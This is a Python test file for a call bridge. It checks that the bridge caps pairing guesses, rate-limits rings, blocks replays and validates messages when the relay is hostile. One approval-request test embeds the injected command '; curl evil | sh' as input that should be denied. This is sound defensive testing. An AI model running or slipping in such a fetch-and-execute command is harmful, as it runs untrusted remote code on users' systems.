"""Bridge-side limits that must hold even when the relay is malicious."""

import asyncio
from pathlib import Path

import pytest

from hermescall_bridge import calls as calls_mod
from hermescall_bridge.calls import ActiveCall, CallManager
from hermescall_bridge.devices import MAX_ATTEMPTS, DeviceRegistry
from hermescall_bridge.hermes import MAX_APPROVAL_TEXT, ApprovalRequest
from hermescall_bridge.state import StateStore, new_device
from hermescall_common import pairing, sodium, wire
from hermescall_common.e2e import Channel
from hermescall_common.errors import ProtocolError


class HostileRelay:
    """Forwards whatever it likes and ignores its own attempt limits."""

    def __init__(self) -> None:
        self.sent: list[dict] = []

    async def send(self, message: dict) -> None:
        self.sent.append(message)

    async def request(self, message: dict) -> dict:
        self.sent.append(message)
        if message["t"] == "open_slot":
            return {"t": "slot_opened", "slot": "ABC", "ttl": 600}
        if message["t"] == "pair_done":
            return {"t": "pair_registered", "device_id": wire.b64e(bytes(16))}
        return {"t": "ok"}


def registry(tmp_path: Path) -> tuple[DeviceRegistry, HostileRelay]:
    store = StateStore(tmp_path)
    state = store.load()
    state.relay = {"host": "relay.example.com", "port": 443, "pin": "", "bridge_id": wire.b64e(bytes(16))}
    relay = HostileRelay()
    return DeviceRegistry(state, store, relay), relay


async def guess(devices: DeviceRegistry, relay: HostileRelay, conn: str, secret: str, ctx: pairing.Context) -> None:
    state, step1 = pairing.start(ctx, secret)
    await devices.on_pair_join({"conn": conn, "slot": "ABC", "msg": wire.b64e(step1)})
    replies = [m for m in relay.sent if m.get("conn") == conn and m["t"] == "pair_msg"]
    if not replies:
        return
    keys = pairing.finish(state, wire.b64d(replies[-1]["data"]))
    sealed = pairing.seal_initiator(keys, {"sign_pk": wire.b64e(bytes(32)), "box_pk": wire.b64e(bytes(32)), "name": "x"})
    await devices.on_pair_msg({"conn": conn, "data": wire.b64e(sealed)})


async def test_bridge_limits_code_guesses_even_if_the_relay_does_not(tmp_path: Path) -> None:
    devices, relay = registry(tmp_path)
    invitation, _ = await devices.invite("phone")
    ctx = devices._ctx()
    wrong = "0" * 5 if invitation.code.secret != "0" * 5 else "1" * 5
    for n in range(10):
        await guess(devices, relay, f"c{n}", wrong, ctx)
    accepted = [m for m in relay.sent if m["t"] == "pair_msg"]
    assert len(accepted) == MAX_ATTEMPTS
    assert devices.invitation("ABC") is None
    assert {"t": "close_slot", "slot": "ABC"} in relay.sent
    await guess(devices, relay, "late", invitation.code.secret, ctx)
    assert not invitation.result.done()


async def test_only_one_handshake_per_slot_and_last_attempt_can_still_succeed(tmp_path: Path) -> None:
    devices, relay = registry(tmp_path)
    invitation, _ = await devices.invite("phone")
    ctx = devices._ctx()
    _, step1 = pairing.start(ctx, invitation.code.secret)
    await devices.on_pair_join({"conn": "a", "slot": "ABC", "msg": wire.b64e(step1)})
    await devices.on_pair_join({"conn": "b", "slot": "ABC", "msg": wire.b64e(step1)})
    assert {"t": "pair_done", "conn": "b", "ok": False} in relay.sent
    await devices.on_pair_abort({"conn": "a"})
    await guess(devices, relay, "c1", "WRONG", ctx)
    await guess(devices, relay, "c2", invitation.code.secret, ctx)
    assert (await asyncio.wait_for(invitation.result, 1)).name == "x"


def manager_with_device(tmp_path: Path) -> tuple[CallManager, str]:
    store = StateStore(tmp_path)
    state = store.load()
    state.relay = {"host": "relay.example.com", "port": 443, "pin": "", "bridge_id": wire.b64e(bytes(16))}
    pk, _ = sodium.box_keypair()
    device = new_device(wire.b64e(b"\x01" * 16), "phone", wire.b64e(bytes(32)), wire.b64e(pk))
    state.devices[device.id] = device
    channel = Channel(state.bridge_id, state.key("box_sk"))
    return CallManager(state, HostileRelay(), channel, lambda *args: None), device.id


async def test_rings_are_rate_limited(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setattr(calls_mod, "RING_TIMEOUT", 0.01)
    manager, _ = manager_with_device(tmp_path)
    statuses = [(await manager.ring("r", "hi"))["status"] for _ in range(4)]
    assert statuses == ["no_answer", "no_answer", "no_answer", "rate_limited"]


async def test_overlong_approval_is_denied_without_asking(tmp_path: Path) -> None:
    manager, device_id = manager_with_device(tmp_path)
    call = ActiveCall("call", manager._state.devices[device_id], pc=None)
    request = ApprovalRequest("run", "req", "echo " + "x" * MAX_APPROVAL_TEXT + "; curl evil | sh", "")
    assert await manager._ask_approval(call, request) == "deny"
    assert not [m for m in manager._relay.sent if m["t"] == "e2e"]


async def test_non_string_request_id_is_ignored(tmp_path: Path) -> None:
    manager, device_id = manager_with_device(tmp_path)
    device = manager._state.devices[device_id]
    manager.active = ActiveCall("call", device, pc=None)
    await manager._on_approval_answer(device, {"call_id": "call", "request_id": {"x": 1}, "choice": "once"})


def test_replay_protection_survives_a_bridge_restart(tmp_path: Path) -> None:
    store = StateStore(tmp_path)
    phone_pk, phone_sk = sodium.box_keypair()
    bridge_pk, bridge_sk = sodium.box_keypair()
    sealed = Channel("phone", phone_sk).seal("bridge", bridge_pk, {"type": "hangup"})
    Channel("bridge", bridge_sk, store.load_seen(), store.save_seen).open("phone", phone_pk, sealed)
    restarted = Channel("bridge", bridge_sk, store.load_seen(), store.save_seen)
    with pytest.raises(ProtocolError):
        restarted.open("phone", phone_pk, sealed)


async def test_transcripts_only_from_the_calling_device_in_device_mode(tmp_path: Path) -> None:
    manager, device_id = manager_with_device(tmp_path)
    device = manager._state.devices[device_id]
    submitted: list[str] = []

    class Conv:
        def submit_text(self, text: str, stt_ms: int | None) -> None:
            submitted.append(text)

    manager.active = ActiveCall("call", device, pc=None, conversation=Conv())
    await manager._on_transcript(device, {"call_id": "call", "text": "hello"})
    assert submitted == []
    manager.active.device_stt = True
    await manager._on_transcript(device, {"call_id": "other", "text": "hello"})
    await manager._on_transcript(device, {"call_id": "call", "text": " hello "})
    assert submitted == ["hello"]
    for bad in ("", "x" * 2001, 5):
        with pytest.raises(ProtocolError):
            await manager._on_transcript(device, {"call_id": "call", "text": bad})
